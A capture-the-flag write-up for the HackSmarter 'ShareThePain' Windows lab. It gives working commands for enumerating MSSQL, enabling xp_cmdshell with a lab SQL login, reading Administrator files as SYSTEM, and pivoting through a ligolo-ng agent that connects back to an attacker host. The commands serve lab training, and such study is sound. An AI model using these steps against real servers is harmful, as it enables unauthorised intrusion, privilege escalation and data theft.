---
layout: writeup
name: "ShareThePain"
platform: "HackSmarter"
category: "hacksmarter"
difficulty: "Unknown"
date: 2025-11-12
pwned: true
---
# ShareThePain — HackSmarter Lab

[![Platform](https://img.shields.io/badge/Platform-HackSmarter-blue)](#) [![Category](https://img.shields.io/badge/Category-Active%20Directory-orange)](#) [![Difficulty](https://img.shields.io/badge/Difficulty-Medium-lightgrey)](#)

## Table of Contents
- [Overview](#overview)
- [Scope & Lab Access](#scope--lab-access)
- [Target Map](#target-map)
- [Enumeration](#enumeration)
  - [Network Scan](#network-scan)
  - [MSSQL](#mssql)
  - [Windows Services](#windows-services)
- [Initial Access](#initial-access)
- [Post-Exploitation Creds](#post-exploitation-creds)
- [Privilege Escalation](#privilege-escation)
- [Pivoting (Ligolo-NG)](#pivoting-ligolo-ng)
- [Proofs](#proofs)
- [Cleanup](#cleanup)
- [Lessons Learned](#lessons-learned)
- [References](#references)
- [Command Log](#command-log)

## Overview
**ShareThePain** is a Windows AD-centric lab focused on abusing **MSSQL** execution and Windows token impersonation to gain **SYSTEM** on a domain host, with optional routing via **ligolo-ng**. This write‑up follows my InkSec “Lock” template and mirrors the official PDF workflow (adapted for clarity and OPSEC in a CTF). Public walkthroughs are allowed.

> Notes: Paths, usernames, and subnets here reflect the lab’s common setup (e.g., `DC01`, domain `hack.smarter`, Server 2022). Replace them with your exact values if they differ.

## Scope & Lab Access
- **Network**: Internal lab (HackSmarter)
- **Representative Hosts**:
  - `DC01` — Windows Server 2022 (Domain Controller, often has **MSSQL** exposed to an internal interface)
- **Attacker**: Kali/Parrot (VPN on `tun0`)
- **Allowed**: Full compromise within the lab environment

## Target Map
```text
Attacker (10.200.0.228)
  └── VPN (tun0)
       └── DC01 (MSSQL 1433)  ← xp_cmdshell / COM abuse  →  NT AUTHORITY\SYSTEM
```

## Enumeration

### Network Scan
    nmap -sC -sV -p 1433,445,5985 dc01 -oN scans/dc01_base.txt
    nxc mssql dc01 -u '' -p '' --instances

### MSSQL
    # Check auth and whoami via xp_cmdshell / mssqlexec
    nxc mssql localhost -u alice.wonderland -p 'newP@ssword2022' -Q "select SYSTEM_USER, CURRENT_USER"
    nxc mssql localhost -u alice.wonderland -p 'newP@ssword2022' -q "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
    nxc mssql localhost -u alice.wonderland -p 'newP@ssword2022' -x "whoami /all"

### Windows Services
If COM/RPC potato chain is in scope, confirm token context after trigger. Expect to reach **NT AUTHORITY\SYSTEM** prior to spawning a payload.

## Initial Access
- Valid SQL creds for `alice.wonderland` yield command execution via **xp_cmdshell**/**mssqlexec**.
- Use well-quoted commands (wrap Windows commands in `cmd /c`):
  
    nxc mssql localhost -u alice.wonderland -p 'newP@ssword2022' -x "cmd /c whoami > C:\temp\who.txt"
    nxc mssql localhost -u alice.wonderland -p 'newP@ssword2022' -x "cmd /c dir C:\Users\Administrator\Desktop > C:\temp\admin_desktop.txt"

## Post-Exploitation Creds
Record anything recovered from the host:
- `hack.smarter\alice.wonderland : newP@ssword2022` (SQL login)
- SYSTEM context available after RPC/COM token abuse
- Any additional local svc creds from files / registry

## Privilege Escation
If a COM/RPC token abuse (“potato”) primitive is provided by the lab, use it to impersonate **SYSTEM**. In some environments, binaries must match **x64** (Server 2022) to spawn processes. Even without spawning a reverse shell, you can still **read and copy restricted files** as SYSTEM via `cmd`.

**Copy the proof as SYSTEM (no shell needed):**
    
    nxc mssql localhost -u alice.wonderland -p 'newP@ssword2022' -x "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\temp\root.txt"
    nxc mssql localhost -u alice.wonderland -p 'newP@ssword2022' -x "cmd /c type C:\temp\root.txt"

If process creation fails with `Win32Error:216`, it’s typically an **arch mismatch** or invalid EXE. Prefer built‑in `cmd`/PowerShell operations for file access where possible.

## Pivoting (Ligolo-NG)
TUN mode gives native routing to internal subnets.

**Relay (attacker):**
    
    ./relay -laddr 0.0.0.0:11601 -autocert -tun

**Host TUN:**
    
    sudo ip tuntap del dev ligolo mode tun 2>/dev/null || true
    sudo ip tuntap add dev ligolo mode tun user $USER
    sudo ip link set ligolo up
    # Route example subnets behind pivot (replace with real lab ranges)
    sudo ip route add 10.10.0.0/24 dev ligolo

**Agent on pivot:**
    
    agent.exe -connect <KALI_IP>:11601 -ignore-cert

Verify:
    
    ip route | grep ligolo
    nmap -e ligolo 10.10.0.0/24 --disable-arp-ping

## Proofs
- **User proof** (redacted): `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`
- **Root proof** (redacted): `yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy`

> Per my publishing policy, flags are partially redacted in public repos.

## Cleanup
- Disable `xp_cmdshell` if you enabled it:
  
    nxc mssql localhost -u alice.wonderland -p 'newP@ssword2022' -q "EXEC sp_configure 'xp_cmdshell',0; RECONFIGURE; EXEC sp_configure 'show advanced options',0; RECONFIGURE;"
- Remove dropped files from `C:\temp\`
- Stop ligolo agents/relay and delete routes/TUN device

## Lessons Learned
- MSSQL execution via **mssqlexec/xp_cmdshell** is reliable if you quote commands with `cmd /c`.
- When spawning external binaries fails, you can still complete objectives by **reading/copying files** under SYSTEM.
- Ligolo‑NG TUN routing is handy for reachability without proxychains.

## References
- HackSmarter course guide for **ShareThePain** (used to align the steps).

## Command Log
```text
# Enable xp_cmdshell and verify execution
nxc mssql localhost -u alice.wonderland -p 'newP@ssword2022' -q "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
nxc mssql localhost -u alice.wonderland -p 'newP@ssword2022' -x "whoami /all"

# Copy the root proof without spawning a shell
nxc mssql localhost -u alice.wonderland -p 'newP@ssword2022' -x "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\temp\root.txt"

# Ligolo (optional pivot)
./relay -laddr 0.0.0.0:11601 -autocert -tun
sudo ip tuntap add dev ligolo mode tun user $USER && sudo ip link set ligolo up
sudo ip route add 10.10.0.0/24 dev ligolo
```
